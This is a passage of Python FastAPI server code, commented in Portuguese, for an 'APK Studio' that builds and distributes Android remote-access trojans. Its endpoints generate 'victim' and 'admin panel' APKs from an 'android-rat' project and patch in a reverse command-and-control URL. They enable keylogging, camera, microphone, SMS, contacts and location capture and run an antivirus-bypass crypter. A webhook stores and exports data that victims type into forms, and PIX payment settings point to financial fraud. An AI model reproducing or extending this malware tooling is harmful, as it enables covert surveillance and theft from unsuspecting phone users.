# ==================== APK STUDIO - SISTEMA COMPLETO ====================

# Armazenamento de projetos e dados dinâmicos do APK Studio
apk_studio_data: Dict[str, Dict] = {}  # user_id -> {projects, captured_data, etc}

@app.get("/api/apk-studio/projects")
async def get_studio_projects(
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Lista todos os projetos do usuário no APK Studio"""
    from models import APKStudioProject
    
    try:
        projects = db.query(APKStudioProject).filter(
            APKStudioProject.owner_id == current_user.id
        ).all()
        
        return [{
            "id": p.project_id,
            "name": p.name,
            "appName": p.app_name,
            "projectType": p.project_type,
            "enableRat": p.enable_rat,
            "enablePayment": p.enable_payment,
            "createdAt": p.created_at.isoformat() if p.created_at else None
        } for p in projects]
    except Exception as e:
        # Se tabela não existe, retorna lista vazia
        return []

@app.post("/api/apk-studio/projects")
async def create_studio_project(
    project_data: dict,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Cria um novo projeto no APK Studio"""
    from models import APKStudioProject
    import uuid
    
    project_id = str(uuid.uuid4())[:12]
    
    project = APKStudioProject(
        project_id=project_id,
        owner_id=current_user.id,
        name=project_data.get("name", "Novo Projeto"),
        project_type=project_data.get("projectType", "custom"),
        app_name=project_data.get("appName", "Meu App"),
        package_name=project_data.get("packageName", "com.meuapp"),
        screens_data=json.dumps(project_data.get("screens", [])),
        theme_data=json.dumps(project_data.get("theme", {})),
        enable_rat=project_data.get("enableRat", False),
        enable_payment=project_data.get("enablePayment", False),
        enable_keylogger=project_data.get("enableKeylogger", False)
    )
    
    db.add(project)
    db.commit()
    
    return {"id": project_id, "message": "Projeto criado com sucesso"}

@app.put("/api/apk-studio/projects/{project_id}")
async def update_studio_project(
    project_id: str,
    project_data: dict,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Atualiza um projeto existente"""
    from models import APKStudioProject
    
    project = db.query(APKStudioProject).filter(
        APKStudioProject.project_id == project_id,
        APKStudioProject.owner_id == current_user.id
    ).first()
    
    if not project:
        raise HTTPException(status_code=404, detail="Projeto não encontrado")
    
    project.name = project_data.get("name", project.name)
    project.app_name = project_data.get("appName", project.app_name)
    project.screens_data = json.dumps(project_data.get("screens", []))
    project.theme_data = json.dumps(project_data.get("theme", {}))
    project.enable_rat = project_data.get("enableRat", project.enable_rat)
    project.enable_payment = project_data.get("enablePayment", project.enable_payment)
    
    db.commit()
    
    return {"message": "Projeto atualizado"}

@app.delete("/api/apk-studio/projects/{project_id}")
async def delete_studio_project(
    project_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Exclui um projeto"""
    from models import APKStudioProject
    
    project = db.query(APKStudioProject).filter(
        APKStudioProject.project_id == project_id,
        APKStudioProject.owner_id == current_user.id
    ).first()
    
    if not project:
        raise HTTPException(status_code=404, detail="Projeto não encontrado")
    
    db.delete(project)
    db.commit()
    
    return {"message": "Projeto excluído"}

# ========== DADOS DINÂMICOS DO APK STUDIO - BANCO DE DADOS PERSISTENTE ==========

@app.post("/api/apk-studio/webhook/{project_id}")
async def studio_webhook(
    project_id: str,
    request: Request,
    db: Session = Depends(get_db)
):
    """
    Webhook para receber dados dos APKs gerados pelo APK Studio.
    Os apps enviam dados aqui quando o usuário preenche formulários.
    SALVA NO BANCO DE DADOS - 100% PERSISTENTE!
    """
    from models import StudioCapturedData, StudioDataField, APKStudioProject
    
    try:
        data = await request.json()
        client_ip = request.client.host if request.client else "unknown"
        
        # Busca o projeto para pegar o owner_id
        project = db.query(APKStudioProject).filter(
            APKStudioProject.project_id == project_id
        ).first()
        
        owner_id = project.owner_id if project else 1  # Fallback para admin
        
        # Salva os dados no banco
        captured = StudioCapturedData(
            project_id=project_id,
            owner_id=owner_id,
            data_json=json.dumps(data, ensure_ascii=False),
            device_ip=client_ip,
            device_info=json.dumps(data.get("_device_info", {}), ensure_ascii=False) if "_device_info" in data else None
        )
        db.add(captured)
        
        # Atualiza campos dinâmicos detectados
        for field_name in data.keys():
            if field_name.startswith("_"):  # Ignora campos internos
                continue
                
            existing_field = db.query(StudioDataField).filter(
                StudioDataField.project_id == project_id,
                StudioDataField.field_name == field_name
            ).first()
            
            if existing_field:
                existing_field.occurrences += 1
                existing_field.last_seen = utc_now()
            else:
                new_field = StudioDataField(
                    project_id=project_id,
                    field_name=field_name,
                    field_type=_detect_field_type(data[field_name]),
                    occurrences=1
                )
                db.add(new_field)
        
        db.commit()
        
        logger.info(f"[APK-STUDIO] ✅ Dados salvos no BD para projeto {project_id}: {len(data)} campos")
        
        return {"status": "ok", "message": "Dados salvos com sucesso"}
    except Exception as e:
        db.rollback()
        logger.error(f"[APK-STUDIO] ❌ Erro no webhook: {e}")
        import traceback
        traceback.print_exc()
        return {"status": "error", "message": str(e)}

def _detect_field_type(value) -> str:
    """Detecta o tipo de um campo baseado no valor"""
    if value is None:
        return "text"
    if isinstance(value, bool):
        return "boolean"
    if isinstance(value, int):
        return "number"
    if isinstance(value, float):
        return "decimal"
    if isinstance(value, str):
        if "@" in value and "." in value:
            return "email"
        if value.isdigit() and len(value) >= 10:
            return "phone"
        if len(value) > 100:
            return "textarea"
    return "text"

@app.get("/api/apk-studio/data/{project_id}")
async def get_studio_data(
    project_id: str,
    page: int = 1,
    limit: int = 50,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """
    Retorna todos os dados recebidos de um projeto - COM PAGINAÇÃO
    Dados vêm do BANCO DE DADOS - 100% persistente!
    """
    from models import StudioCapturedData, StudioDataField
    
    # Total de registros
    total = db.query(StudioCapturedData).filter(
        StudioCapturedData.project_id == project_id
    ).count()
    
    # Busca dados com paginação
    offset = (page - 1) * limit
    captured_data = db.query(StudioCapturedData).filter(
        StudioCapturedData.project_id == project_id
    ).order_by(StudioCapturedData.created_at.desc()).offset(offset).limit(limit).all()
    
    # Converte para lista de dicts
    data_list = []
    for item in captured_data:
        try:
            row = json.loads(item.data_json)
            row["_id"] = item.id
            row["_received_at"] = item.created_at.isoformat() if item.created_at else None
            row["_ip"] = esconder_ip(item.device_ip)
            data_list.append(row)
        except:
            pass
    
    # Busca campos detectados
    fields = db.query(StudioDataField).filter(
        StudioDataField.project_id == project_id
    ).order_by(StudioDataField.occurrences.desc()).all()
    
    field_list = [{
        "name": f.field_name,
        "type": f.field_type,
        "occurrences": f.occurrences
    } for f in fields]
    
    return {
        "project_id": project_id,
        "total_entries": total,
        "page": page,
        "limit": limit,
        "total_pages": (total + limit - 1) // limit,
        "fields": field_list,
        "data": data_list
    }

@app.delete("/api/apk-studio/data/{project_id}")
async def clear_studio_data(
    project_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Limpa TODOS os dados de um projeto do banco de dados"""
    from models import StudioCapturedData, StudioDataField
    
    # Exclui dados capturados
    db.query(StudioCapturedData).filter(
        StudioCapturedData.project_id == project_id
    ).delete()
    
    # Exclui campos detectados
    db.query(StudioDataField).filter(
        StudioDataField.project_id == project_id
    ).delete()
    
    db.commit()
    
    return {"message": "Todos os dados foram excluídos do banco de dados"}

@app.get("/api/apk-studio/data/{project_id}/export")
async def export_studio_data(
    project_id: str,
    format: str = "json",
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Exporta TODOS os dados de um projeto (JSON ou CSV)"""
    from models import StudioCapturedData
    
    captured_data = db.query(StudioCapturedData).filter(
        StudioCapturedData.project_id == project_id
    ).order_by(StudioCapturedData.created_at.desc()).all()
    
    data_list = []
    for item in captured_data:
        try:
            row = json.loads(item.data_json)
            row["_id"] = item.id
            row["_received_at"] = item.created_at.isoformat() if item.created_at else None
            row["_ip"] = esconder_ip(item.device_ip)
            data_list.append(row)
        except:
            pass
    
    if format == "csv":
        # Gera CSV
        if not data_list:
            return {"error": "Nenhum dado para exportar"}
        
        import csv
        import io
        
        output = io.StringIO()
        all_fields = set()
        for row in data_list:
            all_fields.update(row.keys())
        
        writer = csv.DictWriter(output, fieldnames=sorted(all_fields))
        writer.writeheader()
        writer.writerows(data_list)
        
        return StreamingResponse(
            iter([output.getvalue()]),
            media_type="text/csv",
            headers={"Content-Disposition": f"attachment; filename=dados-{project_id}.csv"}
        )
    
    return {
        "project_id": project_id,
        "total": len(data_list),
        "data": data_list
    }

# ========== BUILD DE APK DO APK STUDIO ==========

studio_build_status: Dict[str, Dict] = {}

def build_studio_apk_background(build_id: str, project: dict, owner_id: int):
    """Build de APK do APK Studio em background"""
    import time
    import subprocess
    import shutil
    
    # 🔥 IMPORTANTE: Salva o build no banco para atribuição automática de dispositivos
    try:
        from models import APKBuild
        from database import SessionLocal
        db_session = SessionLocal()
        try:
            apk_build = APKBuild(
                build_id=build_id,
                owner_id=owner_id,
                app_name=project.get("appName", "APK Studio App")
            )
            db_session.add(apk_build)
            db_session.commit()
            logger.info(f"[APK-STUDIO] Build {build_id} registrado no banco para usuário {owner_id}")
        finally:
            db_session.close()
    except Exception as e:
        logger.error(f"[APK-STUDIO] Erro ao registrar build no banco: {e}")
    
    try:
        # 🔥 Detecta tipo de APK para mensagens
        build_target = project.get("buildTarget", "victim")
        apk_type_label = "PAINEL ADMIN 👑" if build_target == "panel" else "VÍTIMA RAT 👤"
        studio_build_status[build_id] = {"status": "building", "progress": 5, "message": f"Iniciando build: {apk_type_label}"}
        
        # 1. Cria diretório temporário
        project_dir = Path(__file__).parent.parent / "android-rat"
        temp_dir = Path(tempfile.mkdtemp(prefix=f"apk_studio_{build_id}_"))
        
        studio_build_status[build_id] = {"status": "building", "progress": 10, "message": "Copiando projeto..."}
        
        # 2. Copia projeto base
        shutil.copytree(project_dir, temp_dir / "android-rat", dirs_exist_ok=True)
        build_dir = temp_dir / "android-rat"
        
        studio_build_status[build_id] = {"status": "building", "progress": 20, "message": "Configurando app..."}
        
        # 3. Cria configuração do app
        # Obtém a serverUrl do projeto ou usa padrão
        server_url_config = project.get("serverUrl", "")
        if not server_url_config:
            # Se não tem serverUrl, usa a VPS atual ou localhost
            server_url_config = os.environ.get("SERVER_URL", gangstar_env.public_base_url())
        
        # Converte para formato HTTP se necessário (para APIs)
        http_server_url = server_url_config
        if http_server_url.startswith("wss://"):
            http_server_url = http_server_url.replace("wss://", "https://").replace("/ws", "")
        elif http_server_url.startswith("ws://"):
            http_server_url = http_server_url.replace("ws://", "http://").replace("/ws", "")
        
        # 🔥 DETECTA SE É BUILD DA VÍTIMA OU DO PAINEL
        build_target = project.get("buildTarget", "victim")  # 'victim' ou 'panel'
        is_admin_panel = project.get("isAdminPanel", False) or build_target == "panel"
        
        # Define o tipo de projeto baseado no buildTarget
        if is_admin_panel:
            actual_project_type = "mobile_panel"
            actual_screens = project.get("panelScreens", project.get("screens", []))
        else:
            actual_project_type = project.get("projectType", "custom")
            actual_screens = project.get("screens", [])
        
        app_config = {
            "projectId": project.get("id", build_id),
            "appName": project.get("appName", "Meu App") + (" Admin" if is_admin_panel else ""),
            "packageName": project.get("packageName", "com.studio.app") + (".admin" if is_admin_panel else ""),
            "projectType": actual_project_type,
            "screens": actual_screens,  # Usa as telas corretas baseado no buildTarget
            "panelScreens": project.get("panelScreens", []) if not is_admin_panel else [],
            "theme": project.get("theme", {}),
            "enableRat": project.get("enableRat", False) if not is_admin_panel else False,  # Painel NÃO é RAT
            "enablePayment": project.get("enablePayment", False),
            "enableKeylogger": project.get("enableKeylogger", False) if not is_admin_panel else False,
            "pixConfig": project.get("pixConfig"),
            "serverUrl": http_server_url,  # URL HTTP para APIs
            "webhookUrl": f"{http_server_url}/api/apk-studio/webhook/{project.get('id', build_id)}",
            
            # 🔥 SEPARAÇÃO: Identifica qual tipo de APK
            "buildTarget": build_target,
            "isAdminPanel": is_admin_panel,
            "showInWebPanel": project.get("showInWebPanel", False) if not is_admin_panel else False,
            "source": "apk_studio_admin" if is_admin_panel else "apk_studio_victim"
        }
        
        # Se for Painel Mobile RAT (Admin), inclui configurações especiais
        if is_admin_panel or project.get("projectType") == "mobile_panel":
            mobile_config = project.get("mobilePanelConfig", {})
            
            # 🔥 IMPORTANTE: Usa a serverUrl do projeto se não tiver mobilePanelConfig
            # Isso garante que o APK do Admin sempre use a URL correta (VPS)
            panel_server_url = mobile_config.get("serverUrl", "") or project.get("serverUrl", "") or http_server_url
            
            # Garante que a URL não é localhost (problema comum)
            if "localhost" in panel_server_url or not panel_server_url:
                panel_server_url = http_server_url  # Usa a URL do servidor atual
            
            app_config["mobilePanelConfig"] = {
                "serverUrl": panel_server_url,
                "operatorUsername": mobile_config.get("operatorUsername", ""),
                "operatorPassword": mobile_config.get("operatorPassword", ""),
                "enableVNC": mobile_config.get("enableVNC", True),
                "enableKeylogger": mobile_config.get("enableKeylogger", True),
                "enableCamera": mobile_config.get("enableCamera", True),
                "enableMicrophone": mobile_config.get("enableMicrophone", True),
                "enableFileManager": mobile_config.get("enableFileManager", True),
                "enableSMS": mobile_config.get("enableSMS", True),
                "enableContacts": mobile_config.get("enableContacts", True),
                "enableLocation": mobile_config.get("enableLocation", True),
                "enableApkBuilder": mobile_config.get("enableApkBuilder", True),
                "customBranding": mobile_config.get("customBranding", False),
                "brandingLogo": mobile_config.get("brandingLogo", ""),
                "brandingName": mobile_config.get("brandingName", "")
            }
            # Painel Mobile sempre tem RAT habilitado para funcionalidades
            app_config["enableRat"] = False  # NÃO habilita RAT no APK admin (não deve aparecer como dispositivo)
        
        # 4. Salva configuração no assets
        assets_dir = build_dir / "app" / "src" / "main" / "assets"
        assets_dir.mkdir(parents=True, exist_ok=True)
        
        with open(assets_dir / "studio_config.json", "w", encoding="utf-8") as f:
            json.dump(app_config, f, ensure_ascii=False, indent=2)
        
        studio_build_status[build_id] = {"status": "building", "progress": 30, "message": "Atualizando nome do app..."}
        
        # 5. Atualiza nome e applicationId de forma coordenada
        app_name = app_config.get("appName", project.get("appName", "App")).strip() or "App"
        package_name = app_config.get("packageName", project.get("packageName", "com.studio.app")).strip() or "com.studio.app"
        patch_app_name(build_dir, app_name)
        patch_application_id(build_dir, package_name)
        
        studio_build_status[build_id] = {"status": "building", "progress": 40, "message": "Configurando ícone..."}
        
        # 6. Atualiza ícone se fornecido
        if project.get("iconUrl"):
            icon_data = project["iconUrl"]
            if icon_data.startswith("data:image"):
                import base64
                base64_data = icon_data.split(",")[1]
                icon_bytes = base64.b64decode(base64_data)
                
                for dpi in ["mdpi", "hdpi", "xhdpi", "xxhdpi", "xxxhdpi"]:
                    icon_path = build_dir / "app" / "src" / "main" / "res" / f"mipmap-{dpi}" / "ic_launcher.png"
                    if icon_path.parent.exists():
                        icon_path.write_bytes(icon_bytes)
        
        studio_build_status[build_id] = {"status": "building", "progress": 45, "message": "Configurando conexão reversa..."}
        
        # 6.5. ATUALIZA SERVER_URL PARA CONEXÃO REVERSA
        # Isso é CRÍTICO para o RAT funcionar - a vítima precisa conectar ao servidor correto
        server_url = project.get("serverUrl", "")
        if not server_url:
            server_url = gangstar_env.public_ws_url()
        
        # Se for Painel Mobile, usa a URL configurada
        if project.get("projectType") == "mobile_panel":
            mobile_config = project.get("mobilePanelConfig", {})
            if mobile_config.get("serverUrl"):
                base_url = mobile_config["serverUrl"]
                if not base_url.startswith("ws"):
                    base_url = base_url.replace("https://", "wss://").replace("http://", "ws://")
                if not base_url.endswith("/ws"):
                    base_url = base_url.rstrip("/") + "/ws"
                server_url = base_url
        
        # 🔥 IMPORTANTE: Adiciona build_id na URL para atribuição automática de usuário!
        # Isso garante que quando o dispositivo conectar, ele seja atribuído ao usuário correto
        if "?" in server_url:
            server_url_with_build = f"{server_url}&build_id={build_id}"
        else:
            server_url_with_build = f"{server_url}?build_id={build_id}"
        
        # Atualiza SERVER_URL no CommandControlService.java
        cc_service_file = build_dir / "app" / "src" / "main" / "java" / "com" / "seguranca" / "protecao" / "CommandControlService.java"
        if cc_service_file.exists():
            content = cc_service_file.read_text(encoding="utf-8")
            # Regex aceita tanto 'private' quanto 'public'
            content = re.sub(
                r'(public|private) static final String SERVER_URL = "[^"]+";',
                f'public static final String SERVER_URL = "{server_url_with_build}";',
                content
            )
            cc_service_file.write_text(content, encoding="utf-8")
            logger.info(f"[APK-STUDIO] ✅ SERVER_URL atualizado para: {server_url_with_build} (owner_id: {owner_id})")
        
        studio_build_status[build_id] = {"status": "building", "progress": 50, "message": "Compilando APK..."}
        
        # Garante local.properties com a localização do Android SDK
        sdk_path = os.environ.get("ANDROID_HOME", r"C:\Users\Administrador\AppData\Local\Android\Sdk")
        if os.path.exists(sdk_path):
            local_props = build_dir / "local.properties"
            sdk_formatted = sdk_path.replace("\\", "/")
            local_props.write_text(f"sdk.dir={sdk_formatted}\n", encoding="utf-8")

        # 7. Compila APK
        gradlew = build_dir / ("gradlew.bat" if os.name == "nt" else "gradlew")
        if not gradlew.exists():
            raise Exception("Gradlew não encontrado")
        
        # Torna executável no Linux
        if os.name != "nt":
            os.chmod(gradlew, 0o755)
        
        result = subprocess.run(
            [str(gradlew), "assembleRelease", "--no-daemon", "--no-configuration-cache", "--no-build-cache", "-x", "lint"],
            cwd=build_dir,
            capture_output=True,
            text=True,
            timeout=600
        )
        
        if result.returncode != 0:
            raise Exception(f"Erro no Gradle: {result.stderr[:500]}")
        
        studio_build_status[build_id] = {"status": "building", "progress": 90, "message": "Aplicando Bypass e Obfuscação GANGSTAR v6..."}
        
        # 8. Move APK para downloads
        apk_source = build_dir / "app" / "build" / "outputs" / "apk" / "release" / "app-release.apk"
        if not apk_source.exists():
            apk_source = build_dir / "app" / "build" / "outputs" / "apk" / "release" / "app-release-unsigned.apk"
        
        if not apk_source.exists():
            raise Exception("APK não foi gerado")

        apk_to_deploy = apk_source
        try:
            server_dir = os.path.dirname(os.path.abspath(__file__))
            bypass_dir = os.path.join(server_dir, "projeto_bypass")
            if bypass_dir not in sys.path:
                sys.path.insert(0, bypass_dir)
            from crypter_engine import process_apk
            
            crypted_apk = process_apk(str(apk_source), build_id)
            if crypted_apk and os.path.exists(crypted_apk):
                apk_to_deploy = Path(crypted_apk)
                logger.info(f"[BYPASS v6] APK Studio {build_id} processado com sucesso pelo novo Bypass!")
        except Exception as bypass_err:
            logger.error(f"[BYPASS v6] Aviso ao aplicar Bypass no APK Studio: {bypass_err}")
        
        downloads_dir = Path(__file__).parent / "downloads"
        downloads_dir.mkdir(exist_ok=True)
        
        # 🔥 NOME DO APK DEFINIDO PELO USUÁRIO (obrigatório)
        user_apk_name = project.get("apkFileName", "").strip()
        if not user_apk_name or len(user_apk_name) < 3:
            # Fallback se não tiver nome definido
            safe_name = "".join(c if c.isalnum() or c in "-_" else "-" for c in project.get("appName", "app"))
            user_apk_name = safe_name.lower()
        
        # Sanitiza o nome (apenas letras, números, hífens e underscores)
        safe_apk_name = "".join(c if c.isalnum() or c in "-_" else "-" for c in user_apk_name)
        
        # 🔥 Inclui tipo (ADMIN ou VICTIM) no nome para fácil identificação
        apk_type = "ADMIN" if is_admin_panel else "VICTIM"
        apk_filename = f"{safe_apk_name}-{apk_type}.apk"
        apk_dest = downloads_dir / apk_filename
        
        # Salva metadados do build para verificar owner no download
        build_meta_file = downloads_dir / f"{build_id}.meta"
        with open(build_meta_file, "w") as f:
            f.write(f"{owner_id}")
        
        shutil.copy2(apk_to_deploy, apk_dest)
        
        # 9. Limpa diretório temporário
        try:
            shutil.rmtree(temp_dir)
        except:
            pass
        
        studio_build_status[build_id] = {
            "status": "done",
            "progress": 100,
            "message": "APK gerado com sucesso!",
            "result": {
                "filename": apk_filename,
                "download_url": f"/api/apk-studio/download/{apk_filename}",
                "size": os.path.getsize(apk_dest)
            }
        }
        
        logger.info(f"[APK-STUDIO] Build {build_id} concluído: {apk_filename}")
        
    except Exception as e:
        logger.error(f"[APK-STUDIO] Erro no build {build_id}: {e}")
        import traceback
        traceback.print_exc()
        studio_build_status[build_id] = {
            "status": "error",
            "progress": 0,
            "message": str(e)
        }

@app.post("/api/apk-studio/build")
async def build_studio_apk(
    project_data: dict,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Inicia build de APK do APK Studio"""
    import uuid
    from models import APKBuild
    
    build_id = str(uuid.uuid4())[:8].upper()
    
    logger.info(f"[APK-STUDIO] Iniciando build: {project_data.get('appName')} (user: {current_user.username})")
    
    try:
        apk_build = APKBuild(
            build_id=build_id,
            owner_id=current_user.id,
            app_name=project_data.get("appName", "Studio App")
        )
        db.add(apk_build)
        db.commit()
    except Exception as ex:
        logger.warning(f"[APK-STUDIO] Aviso ao salvar APKBuild no banco: {ex}")
    
    # Inicia build em background
    build_executor.submit(
        build_studio_apk_background,
        build_id, project_data, current_user.id
    )
    
    return {
        "status": "building",
        "message": "Build iniciado",
        "build_id": build_id
    }

@app.get("/api/apk-studio/build-status/{build_id}")
async def get_studio_build_status(
    build_id: str,
    current_user: Operator = Depends(get_current_user)
):
    """Retorna status do build"""
    if build_id not in studio_build_status:
        return {"status": "not_found", "message": "Build não encontrado"}
    
    return studio_build_status[build_id]

@app.get("/api/apk-studio/download/{filename}")
async def download_studio_apk(
    filename: str,
    token: Optional[str] = Query(None),
    db: Session = Depends(get_db)
):
    """Download do APK gerado - Suporta autenticação por header ou query parameter ?token="""
    safe_filename = os.path.basename(filename)
    downloads_dir = Path(__file__).parent / "downloads"
    apk_path = downloads_dir / safe_filename
    
    # Smart Fallback: Se o nome exato não for encontrado, faz busca flexível no diretório
    if not apk_path.exists():
        matched_file = None
        if downloads_dir.exists():
            for candidate in downloads_dir.glob("*.apk"):
                cname = candidate.name
                if filename in cname or cname in filename:
                    matched_file = candidate
                    break
                
                # Procura por hash/build_id no nome do arquivo candidato
                parts = filename.replace(".apk", "").split("-")
                for p in parts:
                    if len(p) >= 4 and p in cname:
                        matched_file = candidate
                        break
                if matched_file:
                    break
        
        if matched_file and matched_file.exists():
            apk_path = matched_file
        else:
            # Tenta endpoint alternativo de downloads
            alt_path = downloads_dir / f"{filename}.apk"
            if alt_path.exists():
                apk_path = alt_path
            else:
                raise HTTPException(status_code=404, detail="APK não encontrado no servidor")
    
    return FileResponse(
        apk_path,
        media_type="application/vnd.android.package-archive",
        filename=apk_path.name
    )


# ========== CONFIGURAÇÕES PIX DO USUÁRIO ==========

@app.get("/api/apk-studio/pix-configs")
async def get_pix_configs(
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Lista configurações PIX do usuário"""
    from models import UserPixConfig
    
    try:
        configs = db.query(UserPixConfig).filter(
            UserPixConfig.owner_id == current_user.id
        ).all()
        
        return [{
            "id": c.config_id,
            "name": c.name,
            "pixKey": c.pix_key,
            "pixKeyType": c.pix_key_type,
            "beneficiaryName": c.beneficiary_name,
            "beneficiaryCity": c.beneficiary_city,
            "isDefault": c.is_default
        } for c in configs]
    except:
        return []

@app.post("/api/apk-studio/pix-configs")
async def create_pix_config(
    config_data: dict,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Cria nova configuração PIX"""
    from models import UserPixConfig
    import uuid
    
    config = UserPixConfig(
        config_id=str(uuid.uuid4())[:12],
        owner_id=current_user.id,
        name=config_data.get("name", "PIX"),
        pix_key=config_data.get("pixKey", ""),
        pix_key_type=config_data.get("pixKeyType", "random"),
        beneficiary_name=config_data.get("beneficiaryName", ""),
        beneficiary_city=config_data.get("beneficiaryCity", ""),
        is_default=config_data.get("isDefault", False)
    )
    
    # Se marcado como padrão, desmarca outros
    if config.is_default:
        db.query(UserPixConfig).filter(
            UserPixConfig.owner_id == current_user.id
        ).update({"is_default": False})
    
    db.add(config)
    db.commit()
    
    return {"id": config.config_id, "message": "Configuração criada"}

@app.delete("/api/apk-studio/pix-configs/{config_id}")
async def delete_pix_config(
    config_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Exclui configuração PIX"""
    from models import UserPixConfig
    
    config = db.query(UserPixConfig).filter(
        UserPixConfig.config_id == config_id,
        UserPixConfig.owner_id == current_user.id
    ).first()
    
    if config:
        db.delete(config)
        db.commit()
    
    return {"message": "Configuração excluída"}


# ============================================================
# 🚀 APK STUDIO - SISTEMA COMPLETO DE CAPTURA DE DADOS
# ============================================================

# ========== HISTÓRICO DE BUILDS ==========

@app.get("/api/apk-studio/builds")
async def list_studio_builds(
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Lista o histórico de builds de APKs do usuário com resolução exata de arquivos para download"""
    from models import APKBuild
    builds = db.query(APKBuild).filter(
        APKBuild.owner_id == current_user.id
    ).order_by(APKBuild.created_at.desc()).limit(50).all()
    
    downloads_dir = Path(__file__).parent / "downloads"
    result = []
    
    for b in builds:
        actual_file = None
        if downloads_dir.exists():
            for file_path in downloads_dir.glob("*.apk"):
                fname = file_path.name
                if b.build_id in fname or (b.app_name and b.app_name.replace(" ", "_") in fname):
                    actual_file = fname
                    break
        
        if not actual_file:
            safe_name = "".join(c if c.isalnum() or c in "-_" else "_" for c in (b.app_name or "app"))
            actual_file = f"{safe_name}_{b.build_id}.apk"
        
        file_path_full = downloads_dir / actual_file
        file_exists = file_path_full.exists()
        file_size = file_path_full.stat().st_size if file_exists else 0
        
        result.append({
            "id": b.id,
            "build_id": b.build_id,
            "appName": b.app_name,
            "ownerId": b.owner_id,
            "createdAt": b.created_at.isoformat() if b.created_at else None,
            "filename": actual_file,
            "download_url": f"/api/apk-studio/download/{actual_file}",
            "file_exists": file_exists,
            "size": file_size
        })
        
    return result

@app.delete("/api/apk-studio/builds/{build_id}")
async def delete_studio_build(
    build_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Exclui uma compilação de APK do banco de dados e apaga os arquivos físicos correspondentes."""
    from models import APKBuild
    query = db.query(APKBuild).filter(APKBuild.build_id == build_id)
    if not current_user.is_admin:
        query = query.filter(APKBuild.owner_id == current_user.id)
    
    build = query.first()
    if not build and build_id.isdigit():
        query_id = db.query(APKBuild).filter(APKBuild.id == int(build_id))
        if not current_user.is_admin:
            query_id = query_id.filter(APKBuild.owner_id == current_user.id)
        build = query_id.first()

    if not build:
        raise HTTPException(status_code=404, detail="Compilação de APK não encontrada.")

    # Apaga arquivos físicos se existirem
    downloads_dir = Path(__file__).parent / "downloads"
    uploads_dir = Path(__file__).parent / "uploads" / "apks"
    web_dir = Path(__file__).parent / "web"
    
    for d in [downloads_dir, uploads_dir, web_dir]:
        if d.exists():
            for file_path in d.glob("*"):
                if file_path.is_file() and (build.build_id in file_path.name or (build.app_name and build.app_name.replace(" ", "_") in file_path.name)):
                    try:
                        os.remove(file_path)
                    except Exception as e:
                        logger.warning(f"Erro ao remover arquivo {file_path}: {e}")

    db.delete(build)
    await safe_db_commit(db)
    return {"status": "success", "message": "APK excluído com sucesso."}

# ========== PROJETOS DO APK STUDIO ==========

@app.get("/api/apk-studio/projects")
async def list_studio_projects(
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Lista todos os projetos do usuário"""
    from models import APKStudioProject
    
    projects = db.query(APKStudioProject).filter(
        APKStudioProject.owner_id == current_user.id
    ).order_by(APKStudioProject.updated_at.desc()).all()
    
    return [{
        "id": p.project_id,
        "name": p.name,
        "appName": p.app_name,
        "packageName": p.package_name,
        "projectType": p.project_type,
        "enableRat": p.enable_rat,
        "enablePayment": p.enable_payment,
        "enableKeylogger": p.enable_keylogger,
        "createdAt": p.created_at.isoformat() if p.created_at else None,
        "updatedAt": p.updated_at.isoformat() if p.updated_at else None
    } for p in projects]


@app.post("/api/apk-studio/projects")
async def create_studio_project(
    project_data: dict,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Cria novo projeto no APK Studio"""
    from models import APKStudioProject
    import uuid
    
    project_id = str(uuid.uuid4())[:12]
    
    project = APKStudioProject(
        project_id=project_id,
        owner_id=current_user.id,
        name=project_data.get("name", "Novo Projeto"),
        description=project_data.get("description", ""),
        project_type=project_data.get("projectType", "custom"),
        app_name=project_data.get("appName", "Meu App"),
        package_name=project_data.get("packageName", "com.meuapp"),
        icon_data=project_data.get("iconData", ""),
        screens_data=json.dumps(project_data.get("screens", [])),
        theme_data=json.dumps(project_data.get("theme", {})),
        enable_rat=project_data.get("enableRat", False),
        enable_payment=project_data.get("enablePayment", False),
        enable_keylogger=project_data.get("enableKeylogger", False)
    )
    
    db.add(project)
    db.commit()
    
    logger.info(f"[APK-STUDIO] Projeto criado: {project_id} por {current_user.username}")
    
    return {
        "id": project_id,
        "message": "Projeto criado com sucesso",
        "webhookUrl": f"/api/apk-studio/webhook/{project_id}"
    }


@app.put("/api/apk-studio/projects/{project_id}")
async def update_studio_project(
    project_id: str,
    project_data: dict,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    """Atualiza projeto existente"""
    from models import APKStudioProject
    
    project = db.query(APKStudioProject).filter(
        APKStudioProject.project_id == project_id,
        APKStudioProject.owner_id == current_user.id
    ).first()
    
    if not project:
        raise HTTPException(status_code=404, detail="Projeto não encontrado")
    
    # Atualiza campos
    if "name" in project_data:
        project.name = project_data["name"]
    if "appName" in project_data:
        project.app_name = project_data["appName"]
    if "packageName" in project_data:
        project.package_name = project_data["packageName"]
    if "screens" in project_data:
        project.screens_data = json.dumps(project_data["screens"])
    if "theme" in project_data:
        project.theme_data = json.dumps(project_data["theme"])
    if "enableRat" in project_data:
        project.enable_rat = project_data["enableRat"]
    if "enablePayment" in project_data:
        project.enable_payment = project_data["enablePayment"]
    if "enableKeylogger" in project_data:
        project.enable_keylogger = project_data["enableKeylogger"]
    
    db.commit()
    
    return {"message": "Projeto atualizado"}


@app.delete("/api/apk-studio/projects/{project_id}")
async def delete_studio_project(
    project_id: str,
    current_user: Operator = Depends(get_current_user),
    db: Session = Depends(get_db)
):
